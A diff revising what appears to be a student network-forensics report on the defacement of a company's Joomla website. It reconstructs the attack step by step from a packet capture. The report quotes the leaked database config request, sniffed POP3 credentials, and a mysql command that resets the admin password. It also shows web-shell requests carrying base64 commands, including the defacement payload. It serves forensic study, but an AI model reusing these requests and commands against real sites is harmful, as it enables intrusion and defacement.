@@ -46,7 +46,7 @@ After doing so they just had to send some requests to admin-panel in order to fi
 - **2024-05-12 10:27:33 UTC**
 	The attacker sent a email to claudio.volume@potenzio.com spoofing his  credentials while doing so.
 	
-- **2024-05-12 10:28:23 UTC** 
+- **2024-05-12 10:28:05 UTC** 
 	The attacker accessed the Potenzio's backend server using the credentials  previously acquired and installing then mysql-client to modify an admin account's credentials with a password of his choice.
 	
 - **2024-05-12 10:28:52 UTC** 
@@ -66,9 +66,9 @@ They described the attack as a warning and promised more severe actions if the c
 #### 2024-05-12 10:26:19 UTC
 The attacker started a port-scanning session and tried also to access the admin page with default credentials but didn't succeed in doing so.
 
-He then sent a targeted request to **"www.potenzio.com/administrator/manifests/files/joomla.xml"** that describes the complete structure of the joomla extension configuration, from which is possible to gather informations about the DB structure as well.
+He then sent a targeted request to **"www.potenzio.com/administrator/manifests/files/joomla.xml"** in order to get a file that describes the complete structure of the joomla extension configuration, from which is possible to gather informations about the DB structure as well.
 
-Knowing this the attacker sent another request to **"www.potenzio.com/api/index.php/v1/config/application?public=true"** that responded with a json file with the complete db configuration including the password
+After analysing the joomla configuration file the attacker sent then another request to **"www.potenzio.com/api/index.php/v1/config/application?public=true"** that responded with a json file with the complete db configuration including all the credentials to access it.
 
 ```json
 ...
@@ -123,11 +123,10 @@ Knowing this the attacker sent another request to **"www.potenzio.com/api/index.
 ...
 ```
 
-He then tried to use the password to access the admin page but that didn't work 
-
+He then tried to use the database password to access the admin page but it did not work.
 ### Sending the email
 #### 2024-05-12  10:27:33 UTC
-The attacker sent an email to Potenzio disguising himself for a society called **harmonic.com**  with some *"exclusive offers"* just for him as we can read in the message body:
+The attacker sent an email to a Potenzio employee disguising himself for a society called **harmonic.com**  with some *"exclusive offers"* just for him as we can read in the message body:
 
 ```html
 <html>
@@ -144,18 +143,17 @@ The attacker sent an email to Potenzio disguising himself for a society called *
 </html>
 ```
 
-Opening the pcap file with Network Miner we can see some informations about the message itself
+Opening the pcap file with **Network Miner** we can see some informations about the message.
 
 ![](./assets/Network_Assignment_NetworkMiner.png)
 
 Taking a closer look it's possible to see that the mail was sent from a pretty suspicious address ( **smtp.harmonic.com (mx.lockermaster.lol \[58.16.123.111]**) and contained an attachment called [offers.odt](./assets/harmonic_email_attachment).
-Notice that the ip address found in the server is the same as the attacker's one.
-
-Although the attached file seemed to be clean the messages where exchanged using POP3 communication protocol and analysing the packets with a tool like Wireshark  Claudio's credentials could be spoofed easily.
+Notice that the ip address found in the server is the same as the attacker's one as well.
+Although the attached file seemed to be clean the messages where exchanged using POP3 communication protocol and analysing the packets with a tool like Wireshark it was possible to spoof Claudio's credentials
 
 ![](./assets/Network_Assingment_pop_credentials_leaking.png)
 
-We can see that the credentials used where:
+Just by looking at the communication header we can see the credentials in plain text
 
 ```
 User: claudio.volume
@@ -166,18 +164,18 @@ Password: claudione
 ### Accessing the backend server
 #### 2024-05-12 10:28:05 UTC
 
-Using these credentials the attacker invoked a shell on the server, installed mysql-client and accessed the Joomla database changing the password for the admin account to one of his choice:
+Using Claudio's credentials the attacker invoked a shell on the server, installed **mysql-client** and accessed the Joomla database using the credentials obtained through the public json file.
+Doing so he changed the password for an admin account to one of his choice:
 
 ```bash
 claudio.volume@client:/$ mysql -u joomla --password=secret4joomla -h 10.0.100.100 joomladb -e "Update pnv1x_users SET password = 'd2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199' WHERE name='admin';"
 ```
 
-
 ### Modifying the index page
 #### 2024-05-12 10:28:52 UTC
 
 The attacker downloaded some index page templates and from them he forged a new one where the value of a parameter called *random* can be sent in a GET request to the index page.
-If the value of the random parameter is some valid command, once decoded from base 64, is executed on the server using the *system* command.
+If the value of the *random* parameter is some valid command once decoded from base 64, it's executed on the server using the *system* command.
 
 ```php
 [ content of the index page ]
@@ -188,30 +186,31 @@ If the value of the random parameter is some valid command, once decoded from ba
     <jdoc:include type="modules" name="debug" style="none" />
 </body>
 </html>
-&task=template.apply&6ac867e6369185055f5b1ad928d7cbe6=1&jform[extension_id]=223&jform[filename]=/var/www/html/templates/cassiopeia/index.php
+.
+.
+.
+<!-- relevant segment of the attacker's forged template -->
 ```
-
-*relevant fragment of the attacker's template*
 
 Doing so the attacker had access to a reverse shell on Potenzio's server.
 The attacker then tested the newly created template sending a request where the *random* parameter's value was decoded into the  **ls -la** command, exposing the files present on the server
 
-Attacker's forged url :
+Attacker's forged request
 
 ```
 http://www.potenzio.com/?rand=bHMgLWxhCg==
 ```
 
-Decoded parameter:
+Decoded parameter
 
 ```bash
-> base64 -d parameter.txt
+> echo "bHMgLWxhCg==" | base64 -d
 ls -la
 ```
 
-Web page output:
+Web displayed output
 
-```
+```html
 <html>
 .
 . 
@@ -245,26 +244,26 @@ Web page output:
     </html>\n
 ```
 
-After that the attacker proceeded to send another request with the final payload performing the attack itself that overwrote the index page of the Potenzio's website
+After that the attacker proceeded to send another request with the final payload performing the attack itself that overwrote Potenzio's website's index page
 
-Attacker's forged url:
+Attacker's forged request
 
 ```
 http://www.potenzio.com/?rand=YmFzaCAtYyAiY2F0ID4gaW5kZXguaHRtbCA8PCBFT0YKClw8cHJlPgpHcmVldGluZ3MsCldlIGFyZSBFY29EZWZlbmRlcnMuIApXZSBoYXZlIGRpc3J1cHRlZCBhY2Nlc3MgdG8gdGhlIFBvdGVuemlvIHdlYnNpdGUgZm9yIG9uZSBzaW1wbGUgcmVhc29uOiB5b3VyIHBvbGx1dGluZyBwcmVzZW5jZSBvbiBvdXIgcGxhbmV0IGNhbiBubyBsb25nZXIgYmUgaWdub3JlZC4KRm9yIHllYXJzLCBQb3RlbnppbyBoYXMgZGlzcmVnYXJkZWQgdGhlIHdhcm5pbmdzIG9mIHNjaWVudGlzdHMsIHZpb2xhdGVkIGVudmlyb25tZW50YWwgcmVndWxhdGlvbnMsIGFuZCBjb21wcm9taXNlZCB0aGUgaGVhbHRoIG9mIHRob3VzYW5kcyB3aXRoIGl0cyB0b3hpYyBlbWlzc2lvbnMuIApXZSBjYW5ub3Qgc3RhbmQgYnkgc2lsZW50bHkgd2hpbGUgb3VyIHBsYW5ldCBzdWZmZXJzLgpUaGlzIGRlZmFjZW1lbnQgaXMgYSB3YXJuaW5nLiBDaGFuZ2UgeW91ciBwcmFjdGljZXMsIHJlZHVjZSBwb2xsdXRpb24sIGFuZCByZXNwZWN0IHRoZSBFYXJ0aC4gSXQgaXMgbm90IHRvbyBsYXRlIHRvIG1ha2UgYSBkaWZmZXJlbmNlLCBidXQgdGltZSBpcyBydW5uaW5nIG91dC4KCklmIFBvdGVuemlvIGRvZXMgbm90IGJlZ2luIHRvIHRha2UgY29uY3JldGUgbWVhc3VyZXMgdG8gaW1wcm92ZSBpdHMgZW52aXJvbm1lbnRhbCBmb290cHJpbnQsIHdlIHdpbGwgZW5zdXJlIHRoYXQgdGhlIHdvcmxkIGtub3dzIGV2ZXJ5IGRlc3RydWN0aXZlIGFjdGlvbiB0aGV5IHRha2UuIFRoaXMgaXMganVzdCB0aGUgYmVnaW5uaW5nLgoKQWN0IG5vdy4gT3VyIHBsYW5ldCBjYW5ub3Qgd2FpdCBhbnkgbG9uZ2VyLgoKRU9GIgo=
 ```
 
-Decoded parameter:
+Decoded parameter
 
-```
-> base64 -d parameter.txt 
+```bash
+> echo "YmFzaCAtYyAiY2F0ID4gaW5kZXguaHRtbCA8PCBFT0YKClw8cHJlPgpHcmVldGluZ3MsCldlIGFyZSBFY29EZWZlbmRlcnMuIApXZSBoYXZlIGRpc3J1cHRlZCBhY2Nlc3MgdG8gdGhlIFBvdGVuemlvIHdlYnNpdGUgZm9yIG9uZSBzaW1wbGUgcmVhc29uOiB5b3VyIHBvbGx1dGluZyBwcmVzZW5jZSBvbiBvdXIgcGxhbmV0IGNhbiBubyBsb25nZXIgYmUgaWdub3JlZC4KRm9yIHllYXJzLCBQb3RlbnppbyBoYXMgZGlzcmVnYXJkZWQgdGhlIHdhcm5pbmdzIG9mIHNjaWVudGlzdHMsIHZpb2xhdGVkIGVudmlyb25tZW50YWwgcmVndWxhdGlvbnMsIGFuZCBjb21wcm9taXNlZCB0aGUgaGVhbHRoIG9mIHRob3VzYW5kcyB3aXRoIGl0cyB0b3hpYyBlbWlzc2lvbnMuIApXZSBjYW5ub3Qgc3RhbmQgYnkgc2lsZW50bHkgd2hpbGUgb3VyIHBsYW5ldCBzdWZmZXJzLgpUaGlzIGRlZmFjZW1lbnQgaXMgYSB3YXJuaW5nLiBDaGFuZ2UgeW91ciBwcmFjdGljZXMsIHJlZHVjZSBwb2xsdXRpb24sIGFuZCByZXNwZWN0IHRoZSBFYXJ0aC4gSXQgaXMgbm90IHRvbyBsYXRlIHRvIG1ha2UgYSBkaWZmZXJlbmNlLCBidXQgdGltZSBpcyBydW5uaW5nIG91dC4KCklmIFBvdGVuemlvIGRvZXMgbm90IGJlZ2luIHRvIHRha2UgY29uY3JldGUgbWVhc3VyZXMgdG8gaW1wcm92ZSBpdHMgZW52aXJvbm1lbnRhbCBmb290cHJpbnQsIHdlIHdpbGwgZW5zdXJlIHRoYXQgdGhlIHdvcmxkIGtub3dzIGV2ZXJ5IGRlc3RydWN0aXZlIGFjdGlvbiB0aGV5IHRha2UuIFRoaXMgaXMganVzdCB0aGUgYmVnaW5uaW5nLgoKQWN0IG5vdy4gT3VyIHBsYW5ldCBjYW5ub3Qgd2FpdCBhbnkgbG9uZ2VyLgoKRU9GIgo=" | base64 -d
 
 bash -c "cat > index.html << EOF
 
 \<pre>
 Greetings,
-We are EcoDefenders. 
+We are EcoDefenders.
 We have disrupted access to the Potenzio website for one simple reason: your polluting presence on our planet can no longer be ignored.
-For years, Potenzio has disregarded the warnings of scientists, violated environmental regulations, and compromised the health of thousands with its toxic emissions. 
+For years, Potenzio has disregarded the warnings of scientists, violated environmental regulations, and compromised the health of thousands with its toxic emissions.
 We cannot stand by silently while our planet suffers.
 This defacement is a warning. Change your practices, reduce pollution, and respect the Earth. It is not too late to make a difference, but time is running out.
 
